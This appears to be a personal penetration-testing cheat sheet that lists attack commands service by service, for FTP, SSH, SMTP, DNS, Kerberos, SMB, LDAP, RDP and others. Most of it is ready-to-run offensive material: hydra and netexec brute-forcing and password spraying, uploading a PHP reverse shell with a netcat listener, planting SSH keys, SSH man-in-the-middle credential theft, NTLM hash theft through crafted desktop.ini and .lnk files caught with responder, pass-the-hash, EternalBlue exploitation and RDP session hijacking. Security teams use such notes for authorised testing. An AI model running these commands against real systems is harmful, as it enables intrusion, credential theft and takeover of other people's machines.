---
layout: notes
permalink: /notes/network/services/
title: Network Services Pentesting Cheat Sheet
---



# Network Services Pentesting Cheat Sheet

<!-- ------------------------------------------------FTP NOTES----------------------------------------------------------- -->

<details markdown="1">
<summary>FTP (21)</summary>
<p></p>

### Login
```bash
ftp <IP> #optional port
lftp <IP>
anonymous:anonymous
```

### Commands
```bash
cd
ls -a # List all files (even hidden)
put <filename> #Upload file
get <filename> #Download file
mput/mget #Upload/Downlaod multiple files
quit
```
### Download all files
```bash
wget -m ftp://anonymous:anonymous@10.10.10.98
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
wget -r --user="USERNAME" --password="PASSWORD" ftp://server.com/ #If your user/password has special characters
```

### Automation
```bash
#nmap
nmap --script ftp-* -p 21 <IP>

#metasploit
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_bounce
use auxiliary/scanner/ftp/bison_ftp_traversal
use auxiliary/scanner/ftp/colorado_ftp_traversal
use auxiliary/scanner/ftp/titanftp_xcrc_traversal

#Enum dirs
gobuster dir -u ftp://<IP> -w wordlist

#Bruteforce
hydra -l username -P passwords.txt <target-ip> ftp
hydra -L username.txt -p password <target-ip> ftp
hydra -l username -P passwords.txt ftp://<target-ip>
hydra -L usernames.txt -p password ftp://<target-ip>
```

### Configuration
```bash
cat /etc/vsftpd.conf
cat /etc/vsftpd/vsftpd.conf
```

### Reverse Shell
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
# Edit some variables in shell.php
$ip = '<your-local-ip>';
$port = 1234;
#Upload
ftp <target-ip>
# Upload the payload you downloaded
ftp> put shell.php
# Get shell
nc -lvnp 1234
http://vulnerable.com/path/to/ftp/shell.php
```
</details>


<!-- ------------------------------------------------SSH NOTES----------------------------------------------------------- -->


<details markdown="1">
<summary>SSH (22)</summary>
<p></p>

### Basic commands
```bash
sudo systemctl start ssh
sudo systemctl stop ssh
sudo systemctl restart ssh
sudo systemctl status ssh
ps -e | grep ssh
#Config
vim /etc/ssh/sshd_config
#Chek for any Connection
who | grep <username>
#Kill Connections
# -f: full process name to match
sudo pkill -f pts/#
# Authentication logs
grep 'sshd' /var/log/auth.log
```

### Enumeration
```bash
nmap --script ssh-brute -p 22 <target-ip>
nmap --script ssh-auth-methods --script-args="ssh.user=username" -p 22 <target-ip>
nmap --script ssh-* -p 22 <target-ip>

# User enumeration
msfconsole
msf> use auxiliary/scanner/ssh/ssh_enumusers

# Banner and Audit
nc <IP> 22
ssh-audit <target-ip>
```
### Bruteforce
```bash
# -t: tasks
hydra -l username -P passwords.txt <target-ip> ssh -t 4
hydra -L usernames.txt -p password <target-ip> ssh -t 4

# Specific ports
hydra -l username -P passwords.txt -s 2222 <target-ip> ssh -t 4
hydra -l username -P passwords.txt ssh://<target-ip>:2222 -t 4

#Password spraying
hydra -L usernames-list.txt -p Spring2025 ssh://10.1.1.10
```
### Crack SSH Private Key
```bash
ssh2john private_key.txt > hash.txt
# or
python2 /usr/share/john/ssh2john.py private_key.txt > hash.txt

# Crack the password of the private key
john --wordlist=wordlist.txt hash.txt
```
### Connect
```bash
ssh username@<target-ip>
ssh username@<target-ip> -p 22

# Using private key
ssh -i id_rsa username@<target-ip>

# Without username
ssh 10.0.0.1

# Additional options
# If we got the error message "no matching host key type found. Their offer: ssh-rsa..."
ssh -o HostKeyAlgorithms=+ssh-rsa user@10.0.0.1
# If we got error "no matching key exchange method found. Their offer: diffie-hellman-..."
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 user@10.0.0.1

#Test connection
ssh -T username@10.0.0.1
ssh -T username@10.0.0.1 -vvv

#Command execution
ssh username@<target-ip> 'ls -l'

#Windows AD
ssh domain-name\\username@domain-controller

#Via Private Key
cat /home/<victim-user>/.ssh/id_rsa
echo 'copied content of id_rsa' > private_key.txt
chmod 600 private_key.txt
ssh -i private_key.txt victim-user@<remote-ip>
```

### Transfer files
```bash
# Send a file
scp ./example.txt user@<ip>:./example.txt\

# Send a directory
scp -r ./example user@<ip>:/home/<ip>/

# Download a file
scp user@<ip>:/home/<user>/path/to/file.txt .

# Download a directory
scp -r user@<ip>:/home/<user>/path/to/file.txt .
```
### Create SSH Keys
```bash
# Specify the output file
ssh-keygen -f key

# Specify Ed25519
ssy-keygen -t ed25519

#In target machine install ssh
ssh-copy-id username@<target-ip>
```

### Generate SSH Keys and Set Up Public Key to Connect Remote Machine
```bash
#Check if authorized_keys Exists in Remote Machine
ls /home/<remote-user>/.ssh/authorized_keys
#If it exists, you may be able to connect SSH with your keys as victim user.

#Generate SSH Keys in Local Machine
ssh-keygen -f key

#Copy the content of publick key
cat ./key.pub
#Then copy the content of public key you generated.

#Add the Content of Publick Key to authorized_keys
#In remote machine
echo '<content of id_rsa.pub' >> /home/<victim-user>/.ssh/authorized_keys

#Login with Private Key
#In local machine, we have a SSH private key in local machine so we can login the target SSH server with it.
# Change permission of the private key ('key', here)
chmod 600 key
# Login with it
ssh victim@<target-ip> -i key
```
### Stealing Credentials via MiTM
```bash
# If not have the ssh-mitm, install first.
pip3 install ssh-mitm --upgrade

# --enable-trivial-auth: The "trivial authentication" phishing attack
# --remote-host: Specify the target ip/domain
# --listen-port: Specify the ip address to listen in local machine
ssh-mitm server --enable-trivial-auth --remote-host example.com --listen-port 2222
```

</details>


<!-- ------------------------------------------------TELNET NOTES----------------------------------------------------------- -->

<details markdown="1">
<summary>Telnet (23)</summary>
<p></p>

### Enumeration
```bash
nmap -n -sV -Pn --script "*telnet*" -p 23 {IP}
nmap --script telnet-encryption -p 23 <target-ip>
nmap --script telnet-ntlm-info -p 23 <target-ip>
nmap --script telnet-brute --script-args userdb=users.txt,passdb=passwords.txt,telnet-brute.timeout=8s -p 23 <target-ip>
```

### Configuration
```bash
cat /etc/inetd.conf
# or
cat /etc/xinetd.d/telnet
cat /etc/xinetd.d/stelnet
```

### Connect
```bash
telnet <target-ip> <target-port>
telnet <target-ip> 23
```
</details>


<!-- ------------------------------------------------SMTP NOTES----------------------------------------------------------- -->


<details markdown="1">
<summary>SMTP (25/465/587)</summary>
<p></p>

### Enumeration
```bash
nmap --script smtp-brute -p 25,465,587 <target-ip>
nmap --script smtp-commands -p 25,465,587 <target-ip>
nmap --script smtp-enum-users -p 25,465,587 <target-ip>
nmap --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=example.com -p 25,465,587 <target-ip>
nmap --script smtp-vuln-cve2011-1764 -p 25,465,587 <target-ip>
nmap --script smtp-* -p 25,465,587 <target-ip>

# MX Domains
dig mx example.com

#Metasploit
use auxiliary/scanner/smtp/smtp_enum
```

### Users
```bash
# VRFY - check if the user exists in the SMTP server
smtp-user-enum -M VRFY -u <username> -t <target-ip>
smtp-user-enum -M VRFY -U usernames.txt -t <target-ip>

# RCPT - check if the user is allowed to receive mails in the SMTP server
smtp-user-enum -M RCPT -u <username> -t <target-ip>
smtp-user-enum -M RCPT -U usernames.txt -t <target-ip>

# EXPN - reveal the actual email address
smtp-user-enum -M EXPN -u <username> -t <target-ip>
smtp-user-enum -M EXPN -D <hostname> -U usernames.txt -t <target-ip>
```

### STARTTLS
```bash
# port 25
openssl s_client -starttls smtp -connect <target-ip>:25
# Port 465
openssl s_client -crlf -connect <target-ip>:465
# Port 587
openssl s_client -starttls smtp -crlf -connect <target-ip>:587
```

### Connect
```bash
nc <target-ip> 25
# or
telnet <target-ip> 25
```

### Commands
```bash
# Identify SMTP Server
helo example.com
# List all supported enhanced functions
ehlo example.com
# 8BITMIME - allow to send 8-bit data
# AUTH - authentication for the SMTP connection
# CHUNKING - transfer chunks of data
# DSN (Delivery Status Notifications) - notify delivery status
# ENHANCEDSTATUSCODES - allow to show more details of the status
# ETRN - process remote queue
# EXPN - expand mailing list
# HELP - help about commands
# PIPELINING - allow the multiple commands
# SIZE - maximum message size that can be received
# SMTPUTF8 -
# STARTTLS - communicate with TLS
# SEND - send message to terminal
# TURN - swap client and server
# VRFY - check if the user exists in the SMTP server

# Auth Login
# The AUTH LOGIN command allows us to login. We need to input username/password in Base64.
334 VXNlcm5hbWU6 # Base64-encoded "username:"
dGVzdA== # Base64-encoded "test"
334 UGFzc3dvcmQ6 # Base64-encoded "password:"
cGFzc3dvcmQ= # Base64-encoded "password"

# Messages
## 1. check if the user exists
vrfy <username>
vrfy root
# 2. set the address of the mail sender
mail from: <username>
mail from: root
mail from: sender@example.com
# 3. set the address of the mail recipient
rcpt to: <username>
rcpt to: root
rcpt to: recipient@example.com
# 4. send data of message (the message end with ".")
data
subject: Test Mail
This is a test mail.

# process remote queue
etrn example.com
# list the mailing list
expn example.com
```

### Send Mail
```bash
# Tool https://github.com/jetmore/swaks
swaks --to remote-user@example.com --from local-user@<local-ip> --server mail.example.com --body "hello"

# --attach: Attach a file
swaks --to remote-user@example.com --from local-user@<local-ip> --server mail.example.com --body "hello" --attach @evil.docx
```

### Start SMTP Server
```bash
# -n: No setuid
# -c: Classname
sudo python3 -m smtpd -n -c DebuggingServer 10.0.0.1:25
```
</details>


<!-- ------------------------------------------------DNS NOTES----------------------------------------------------------- -->


<details markdown="1">
<summary>DNS (53)</summary>
<p></p>

### Enumeration
```bash
# Nmap
nmap --script dns-nsec-enum --script-args dns-nsec-enum.domains vulnerable.com -p 53 <target-ip>
nmap --script dns-random-srcport -p 53 <target-ip>
nmap --script dns-recursion -p 53 <target-ip>
nmap --script dns-service-discovery -p 53 <target-ip>
nmap --script dns-* -p 53 <target-ip>
nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" <target-ip>

# Get IP address from the domain
host example.com

# Reverse Lookup (Resolves domain name from IP address)
dig -x <ip>
dig -x 8.8.8.8
```

### Online Tools
[https://dnsdumpster.com/](https://dnsdumpster.com/)

### Subdomain Discovery
```bash
dnsenum --dnsserver <target-ip> -f wordlist.txt example.com

# Do not scrape from Google search
# -p: The number of google search pages
# -s: The maximum number of subdomains that will be scraped from Google
dnsenum --dnsserver <target-ip> --enum -p 0 -s 0 -f wordlist.txt example.com

# Fuzzing
# ffuf tool
ffuf -w /usr/share/wordlists/dirb/small.txt -u http://victim.htb/ -H "Host: FUZZ.victim.htb" -c -fc 301
ffuf -H "Host: FUZZ.$DOMAIN" -H "User-Agent: PENTEST" -c -w "/path/to/wordlist.txt" -u $URL
ffuf -c -r -w "/path/to/wordlist.txt" -u "http://FUZZ.$TARGET/"
# gobuster tool
gobuster vhost --useragent "PENTEST" --wordlist "/path/to/wordlist.txt" --url $URL
# wfuzz tool
wfuzz -H "Host: FUZZ.victim.com" --hc 404,403 -H "User-Agent: PENTEST" -c -z file,"/path/to/wordlist.txt" $URL
```

### DNS Records
```bash
# ANY (all) record
did example.com ANY
dig example.com @<dns-ip> ANY
dig example.com +nocmd +noall +answer ANY

# NS (nameserver) record
dig example.com NS

# TXT record
dig example.com TXT

# Specify a public DNS server
# Cloudflare
dig example.com @1.1.1.1
# Google
dig example.com @8.8.8.8
# Quad9
dig example.com @9.9.9.9
```

### Zone Transfer
The zone transfer is the process of copying the zone file on a primary DNS server to a secondary DNS server.
```bash
# axfr: Check if the Full Zone Transfer (AXFR) is available
dig @<nameserver> AXFR
dig example.com @<nameserver> AXFR
dig example.com @example.com AXFR
dig <zone-name> @<nameserver> AXFR
```

### BIND
```bash
# BIND version
dig @<nameserver-address> chaos txt version.bind
```

### Configuration
```bash
# In Linux
/etc/bind/named.conf
/etc/bind/named.conf.options
/etc/bind/named.conf.local
/etc/bind/named.conf.default-zones

#Example: If we found the secret key such like below, we can update DNS zone.
# /etc/bind/named.conf
key "rndc-key" {
    algorithm hmac-sha256;
    secret "zBatC828gunRa...bA=";
};
# We can update DNS Zone with the nsupdate command:
# -d: Debug mode
# -y: Set the literal TSIG (Transaction Signature) authentication key.
nsupdate -d -y hmac-sha256:rndc-key:zBatC828gunRa...bA= 
Creating key...
namefromtext
keycreate
# Enter target domain
> server example.com
# Enter the new record
# 86400: The TTL (Time-To-Live) for the DNS record. Set 86400 seconds (24 hours) here.
# IN: Internet
# A: A record
# 10.0.0.1: Set your local ip address
> update add sub.example.com 86400 IN A 10.0.0.1
> send
Reply from SOA query:
...
```

### Resolve domains
```bash
#Edit /etc/hosts file as root to add custom domains.
nano /etc/hosts

# Add the custom domain
10.0.0.2  vulnerable.com sub.vulnerable.com
10.0.0.3  vulnerable2.com

sudo systemctl restart systemd-hostnamed
```

### Set DNS Resolver
```bash
#Edit /etc/resolv.conf file as root to add custom nameservers.
nano /etc/resolv.conf

#Google
nameserver 8.8.8.8
nameserver 8.8.4.4
# IPv6
nameserver 2001:4860:4860::8888
nameserver 2001:4860:4860::8844

#Cloudflare
nameserver 1.1.1.1

sudo systemctl restart systemd-resolved.service
```

### DNS Cache
```bash
#Clear IP addresses or DNS records from caches.
sudo resolvectl flush-caches
# or
sudo systemd-resolve --flush-cache

#Check DNS caches are actually flushed
sudo resolvectl statistics
# or
sudo systemd-resolve --statistics
```
</details>

<!-- ------------------------------------------------Kerberos NOTES----------------------------------------------------------- -->


<details markdown="1">
<summary>Kerberos (88)</summary>
<p></p>

### Enumeration
```bash
nmap --script krb5-enum-users --script-args krb5-enum-users.realm='example.local'-p 88 <target-ip>
```

### Bruteforce Authentication
```bash
#Using nmap script (brute usernames)
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="{Domain_Name}",userdb={Big_Userlist} {IP}


#Using Kerbrute: https://github.com/ropnop/kerbrute (brute usernames and passwords)
# --dc: domain controller
# -d: domain
# combos.txt: the wordlist specified must be combinations with "username:password".
kerbrute bruteforce --dc 10.0.0.1 -d example.domain combos.txt
# Users enumeration
kerbrute userenum --dc 10.0.0.1 -d example.domain usernames.txt
# Brute force user's password
kerbture bruteuser --dc 10.0.0.1 -d example.domain passwords.txt username
```

### Get list of user service principal names (SPNs)
```bash
# If you know creds
impacket-GetUserSPNs.py -request -dc-ip {IP} active.htb/svc_tgs
```

</details>


<!-- ------------------------------------------------POP NOTES----------------------------------------------------------- -->


<details markdown="1">
<summary>POP3 (110/995)</summary>
<p></p>

### Enumeration
```bash
# Banner grab
nc -nv {IP} 110

# Retrieve POP3 server capabilities (CAPA, TOP, USER, SASL, RESP-CODES, LOGIN-DELAY, PIPELINING, EXPIRE, UIDL, IMPLEMENTATION)	
nmap -v -sV --version-intensity=5 --script pop3-capabilities -p T:110 IP

# Try to bruteforce POP3 accounts
nmap --script pop3-brute --script-args pop3loginmethod=SASL-LOGIN -p T:110 IP
nmap --script pop3-brute --script-args pop3loginmethod=SASL-CRAM-MD5 -p T:110 IP
nmap --script pop3-brute --script-args pop3loginmethod=APOP -p T:110 IP

#Hydra Bruteforce (need username)
hydra -l {Username} -P {Big_Passwordlist} -f {IP} pop3 -V
```

### Commands
```bash
# Login
USER <username>
PASS <password>

# Number and total size of all messages
STAT
# List messages and size
LIST
# Retrieve the message of given number
RETR <number>
# Delete the message of given number
DELE <number>
# Reset the mailbox
RSET
# Exit the mail server
QUIT
```
</details>


<!-- ------------------------------------------------RPC NOTES----------------------------------------------------------- -->


<details markdown="1">
<summary>RPC (135/593)</summary>
<p></p>

### Enumeration
```bash
#nmap
nmap --script msrpc-enum -p 135 <target-ip>

#rpcdump
rpcdump.py <IP> -p 135
impacket-rpcdump -port 135 <target-ip> | grep -E 'MS-EFSRPC|MS-RPRN|MS-PAR'

#metasploit
use auxiliary/scanner/dcerpc/endpoint_mapper
use auxiliary/scanner/dcerpc/hidden
use auxiliary/scanner/dcerpc/management
use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

#enum4linux
# Do everything
enum4linux -a target-ip
# List users
enum4linux -U target-ip
# If you've managed to obtain credentials, you can pull a full list of users regardless of the RestrictAnonymous option
enum4linux -u administrator -p password -U target-ip
# Get username from the defaut RID range (500-550, 1000-1050)
enum4linux -r target-ip
# Get username using a custom RID range
enum4linux -R 600-660 target-ip
# List groups
enum4linux -G target-ip
# List shares
enum4linux -S target-ip
# Perform a dictionary attack, if the server doesn't let you retrieve a share list 
enum4linux -s shares.txt target-ip
# Pulls OS information using smbclient, this can pull the service pack version on some versions of Windows
enum4linux -o target-ip
# Pull information about printers known to the remove device.
enum4linux -i target-ip
```

### Connect
```bash
# Anonymous logon
rpcclient -N -U "" <target-ip>
rpcclient -N -U "" -p 593 <target-ip>
rpcclient -N -U "" dc.example.local

# Specify username
# -W: Workgroup
# -N: No password
rpcclient -U username <target-ip>
rpcclient -W WORKGROUP -U username <target-ip>
rpcclient -U username -N <target-ip>

# -k: Kerberos authentication
rpcclient -k <target-ip>
```

### Commands
```bash
# Server info
rpcclient $> srvinfo
# Enumerate domains
rpcclient $> enumdomains
# Enumerate domain users
rpcclient $> enumdomusers
# Enumerate domain groups
rpcclient $> enumdomgroups
# Domain info
rpcclient $> querydominfo
# Current username
rpcclient $> getusername
```
</details>


<!-- ------------------------------------------------SMB NOTES----------------------------------------------------------- -->


<details markdown="1">
<summary>SMB (139/445)</summary>
<p></p>

### Enumeration
```bash
#nmap
nmap --script smb-brute -p 139,445 <target-ip>
nmap --script smb-enum-shares.nse,smb-enum-users.nse -p 139,445 <target-ip>
nmap --script smb-enum* -p 139,445 <target-ip>
nmap --script smb-protocols -p 139,445 <target-ip>
nmap --script smb-vuln* -p 139,445 <target-ip>

# NetBIOS names
nmblookup -A 10.0.0.1
nbtscan 10.0.0.1
nbtscan -r 10.0.0.1/24

# Enum4linux
enum4linux <target-ip>
# All enumeration
enum4linux -a <target-ip>
# Verbose
enum4linux -v <target-ip>
# Specify username and password
enum4linux -u username -p password <target-ip>

# Enum4linux-ng
# -A: All simple enumeration including nmblookup
enum4linux-ng -A <target-ip>
# -As: All simple short enumeration without NetBIOS names lookup
enum4linux-ng -As <target-ip>
# -u: Specific username
# -p: Specific password
enum4linux-ng -u "administrator" -p "password" <target-ip>

# NetExec (https://www.netexec.wiki/)
netexec smb 10.0.0.0/24
netexec smb <target-ip>
netexec smb <target-ip-1> <target-ip-2>
netexec smb <target-ip> --pass-pol
netexec smb <target-ip> --groups
netexec smb <target-ip> --users
# Specify username/password
netexec smb <target-ip> -u username -p password
netexec smb <target-ip> -u username -p password --users
# -M zerologon: Scan for ZeroLogon
# -M petitpotam: Scan for PetitPotam
netexec smb <target-ip> -u '' -p '' -M zerologon -M petitpotam
```
### Find Shared Folders
```bash
# -N: No password
# -L: List shared directories
smbclient -N -L <target-ip>
smbclient -L <target-ip> -U username

smbmap -H <target-ip>
# Recursive
smbmap -H <target-ip> -R
# Username and password
smbmap -u username -p password -H <target-ip>
# Execute a command
smbmap -u username -p password -H <target-ip> -x 'ipconfig'

netexec smb <target-ip> -u '' -p '' --shares
netexec smb <target-ip> -u username -p password --shares

impacket-psexec example.local/username@<target-ip>
```
### Bruteforce
```bash
netexec smb <target-ip> -u username -p passwords.txt --continue-on-success
netexec smb <target-ip> -u usernames.txt -H ntlm_hashes.txt --continue-on-success

hydra -l username -P passwords.txt <target-ip> smb
hydra -L usernames.txt -p password <target-ip> smb

# RID Brute Force
netexec smb <target-ip> -u username -p password --rid-brute 20000

# Using Metasploit
msfconsole -q
msf> use auxiliary/scanner/smb/smb_login

#If we find credentials, we can use them for smbclient or WinRM. 
#If we got "STATUS_PASSWORD_MUST_CHANGE" for some users, we can update a current password to a new one.
smbpasswd -r <target-ip> -U <username>
# or
impacket-smbpasswd <DOMAIN>/<username>:<password>@<target-ip> -newpass <new-password>
# If you don't have impacket-smbpasswd, download it from a repository.
wget https://raw.githubusercontent.com/fortra/impacket/master/examples/smbpasswd.py
```

### Password Spraying
```bash
# User enumeration
netexec smb <target-ip> -u John -p Password123 --users
netexec smb <target-ip> -u John -H <NTLM_HASH> --users

# Find users with same password
netexec smb <target-ip> -u users.txt -p Password123 --continue-on-success
netexec smb <target-ip> -u users.txt -p found_passwords.txt --continue-on-success
netexec smb <target-ip> -u users.txt -H <NTLM_HASH> --continue-on-success
netexec smb <target-ip> -u users.txt -H found_ntlm_hashes.txt --continue-on-success
```

### RID Cycling Attack
RID Enumeration. It attempts to enumerate user accounts through null sessions.
```bash
# Anonymous logon
# 20000: Maximum RID to be cycled
impacket-lookupsid example.local/anonymous@<target-ip> 20000 -no-pass
impacket-lookupsid example.local/guest@<target-ip> 20000 -no-pass
impacket-lookupsid example.local/guest@<target-ip> 20000
# Specify user
impacket-lookupsid example.local/user@<target-ip> 20000 -hashes <lmhash>:<nthash>
impacket-lookupsid example.local/user@<target-ip> 20000


# USEFUL COMMAND
# This command extract usernames. It's useful for further enumeration which uses usernames.
# Replace the following keywords:
#  - `example.com` => Target domain
#  - `10.0.0.1`    => Target IP
#  - `DOMAIN`      => Target domain name
impacket-lookupsid example.com/guest@10.0.0.1 20000 -no-pass > tmp.txt | cat tmp.txt | grep SidTypeUser | cut -d ' ' -f 2 | sed 's/DOMAIN\\//g' | sort -u > users.txt && rm tmp.txt
```

### NTLM Stealing via ntlm_tool
```bash
git clone https://github.com/Greenwolf/ntlm_theft
# -g all: Generate all files.
# -s: Local IP (attacker IP)
# -f: Folder to store generated files.
python3 ntlm_theft -g all -s <local-ip> -f samples

#After generating files with ntlm_theft put the .lnk file to shared folder
smbclient -N //10.0.0.1/example
smb> put samples.lnk

#Start responder
sudo responder -I eth0
```

### NTLM Stealing via Desktop.ini
```bash
#We can retrieve the hashes by putting desktop.ini file, that contains arbitrary icon resource path, to the shared folder.
#Create a new desktop.ini in local machine.
[.ShellClassInfo]
IconResource=\\<local-ip>\test

#Then upload it to the writable shared folder.
put desktop.ini

#Start responder
sudo responder -I eth0
```

### Connect
```bash
# anonymous login
smbclient //10.0.0.1/somedir -N
# If the folder name contains spaces, surround with double quotes
smbclient "//10.0.0.1/some dir" -N
# Specify user
smbclient //10.0.0.1/somedir -U username
# nobody, no-pass
smbclient //10.0.0.1/somedir -N -U nobody
# Specify workgroup
smbclient -L 10.0.0.1 -W WORKGROUP -U username

#Windows shell
impacket-wmiexec example.local/username@10.0.0.1
# Pass the Hash
impacket-wmiexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1
```

### Commands
```bash
ls
get file.txt
get "my document.txt"

#Download all files
mask ""
recurse ON
prompt OFF
mget *

#Download files using smbget
smbget smb://<target-ip>/somedir/example.txt -U username
smbget -R smb://<target-ip>/somedir -U username
# Specify workgroup
smbget -R smb://<target-ip>/somedir -w WORKGROUP -U username
# as anonymous user
smbget smb://<target-ip>/somedir -U anonymous
password: anonymous

#Upload files
put example.txt

#Reverse shell
put shell.aspx
#Configure listener
nc -lvnp 4444
#Access the shared file
https://example.com/path/to/smb/share/shell.aspx
```

### Eternal Blue (MS17-010)
```bash
#Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set rhosts <target-ip>
set lhost <local-ip>
run
# If you cannot get a shell with the default payloed (windows/x64/meterpreter/reverse_tcp), try to change the payload
set payload payload/generic/shell_reverse_tcp

#Automated tool (autoblue)
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
python zzz_exploit.py -target-ip <target-ip> -port 445 'username:password@target'
```

</details>


<!-- ------------------------------------------------IMAP NOTES----------------------------------------------------------- -->


<details markdown="1">
<summary>IMAP (143/993)</summary>
<p></p>

### Enumeration
```bash
nc -nv <IP> 143
openssl s_client -connect <IP>:993 -quiet
nmap --script imap-capabilities -p 143 <target-ip>

#metasploit
use auxiliary/scanner/imap/imap_version
set RHOSTS {IP}
set RPORT 143
```

### Connect
```bash
telnet 10.0.0.1 143
```

### Commands
```bash
# Login
a1 login "<username>" "<password>"
#List Folders/Mailboxes
A1 LIST "" *
A1 LIST INBOX *
A1 LIST "Archive" *
#Select a mailbox
A1 SELECT INBOX
#List messages
A1 FETCH 1:* (FLAGS)
A1 UID FETCH 1:* (FLAGS)
#Retrieve Message Content
A1 FETCH 2 body[text]
A1 FETCH 2 all
# Logout
a1 logout
# Close mailbox
a1 close
```
</details>


<!-- ------------------------------------------------LDAP NOTES----------------------------------------------------------- -->


<details markdown="1">
<summary>LDAP (389/636/3268/3269)</summary>
<p></p>

### Enumeration
```bash
# Nmap
nmap --script ldap-brute --script-args ldap.base='"cn=users,dc=cqure,dc=net"' -p 389 <target-ip>
nmap --script ldap-search -p 389 <target-ip>
nmap --script ldap-* -p 389 <target-ip>
nmap --script "ldap* and not brute" -p 389 <target-ip>
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials


# NetExec
# -k: Use Kerberos authentication
netexec ldap <target-ip> -u usernames.txt -p '' -k
# --trusted-for-delegation: Enumerate computers and users with the flag `TRUSTED_FOR_DELEGATION`
# reference: https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties#property-flag-descriptions
netexec ldap <target-ip> -u username -p password --trusted-for-delegation
```

### ldapsearch
```bash
# -x: Simple authentication
# -b: base dn for search
ldapsearch -x -H ldap://10.0.0.1 -b "dc=example,dc=com"
ldapsearch -x -H ldaps://10.0.0.1:636 -b "dc=example,dc=com"

# As administrator
# -D: bind DN
# -w: bind password
ldapsearch -x -H ldap://10.0.0.1 -b "dc=example,dc=com" -D "cn=admin,dc=example,dc=com" -w password
ldapsearch -x -H ldap://10.0.0.1 -b "dc=example,dc=com" -D "cn=admin,dc=example,dc=com" -W

# Search sAMAccountName
ldapsearch -x -H ldap://10.0.0.1 -b "dc=example,dc=com" -D "workspace\\ldap" -w 'password' "(objectclass=*)" "sAMAccountName"
ldapsearch -x -H ldap://10.0.0.1 -b "dc=example,dc=com" -D "workspace\\ldap" -w 'password' "(objectclass=*)" "sAMAccountName" | grep sAMAccountName

# Get information
ldapsearch -x -H ldap://10.0.0.1 -b "cn=sample,cn=Users,dc=example,dc=com" -w 'password' "(objectclass=*)" -D "example\\name"
```

### Against AD
```bash
# --no-html: Disable html output
# --no-grep: Disable greppable output
# -o: Output dir
ldapdomaindump -u 'DOMAIN\username' -p password <target-ip> --no-html --no-grep -o dumped

# Research
ldapsearch -LLL -x -H ldap://pdc01.lab.ropnop.com -b ‘’ -s base ‘(objectclass=*)’

# Windapsearch is a good tool to automate the job (https://github.com/ropnop/windapsearch)
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
</details>


<!-- ------------------------------------------------RDP NOTES----------------------------------------------------------- -->


<details markdown="1">
<summary>RDP (3389)</summary>
<p></p>

## Enumeration
```bash
nmap --script rdp-enum-encryption -p 3389 <target-ip>
nmap --script rdp-ntlm-info -p 3389 <target-ip>
nmap --script rdp* -p 3389 <target-ip>
```


## Bruteforce (can lock accounts)
```bash
# Hydra
hydra -l username -P passwords.txt <target-ip> rdp
hydra -L usernames.txt -p password <target-ip> rdp

# Crowbar https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

#Password spraying via RDPassSpray
git clone https://github.com/xFreed0m/RDPassSpray
#Options:
RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]
#Usage:
python3 RDPassSpray.py -U users.txt -p Spring2025! -t 10.100.10.240:3389

# impacket-red_check - if some credentials are valid for a RDP service:
rdp_check <domain>/<name>:<password>@<IP>
```

## Connect
```bash
# -------------------remmina-------------------
# -c: Connect given URI or file
remmina -c rdp://username@vulnerable.com
remmina -c rdp://domain\\username@vulnerable.com
remmina -c rdp://username:password@vulnerable.com
# Settings
# Keyboard mapping
1. On Remmina client window, click menu icon and move to "Preferences".
2. Navigate to "RDP" tab and check "Use client keyboard mapping".
3. Reboot Remmina

# -------------------FreeRDP-------------------
xfreerdp /u:username /v:10.0.0.1:3389
xfreerdp /u:username /p:password /cert:ignore /v:10.0.0.1 /workarea
# Create a shared drive (/drive:LOCAL_DIR,SHARE_NAME)
xfreerdp /u:username /p:password /drive:.,share /v:10.0.0.1
# Useful command for exploiting
xfreerdp /v:10.0.0.1 /u:username /p:password +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
# On remote Windows
# Access share directory in Command Prompt or PowerShell
\\tsclient\\~share\

# -------------------Rdesktop-------------------
rdesktop -u username -p password 10.0.0.1:3389
```

## Session Stealing
```bash
# Get openned sessions:
query user
# Access to the selected session
tscon <ID> /dest:<SESSIONNAME>

# Using mimikatz
ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session

# Try combine with https://github.com/linuz/Sticky-Keys-Slayer
```

## Adding user to RDP Group
```powershell
net localgroup "Remote Desktop Users" UserLoginName /add
```

## Post Exploitation
```bash
# AutoRDPwn
# https://github.com/JoelGMSec/AutoRDPwn
# AutoRDPwn is a post-exploitation framework created in Powershell, designed primarily to automate the Shadow attack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to view his victim's desktop without his consent, and even control it on demand, using tools native to the operating system itself.

# evilrdp
# https://github.com/skelsec/evilrdp
# - Control mouse and keyboard in an automated way from command line
# - Control clipboard in an automated way from command line
# - Spawn a SOCKS proxy from the client that channels network communication to the target via RDP
# - Execute arbitrary SHELL and PowerShell commands on the target without uploading files
# - Upload and download files to/from the target even when file transfers are disabled on the target
```
</details>


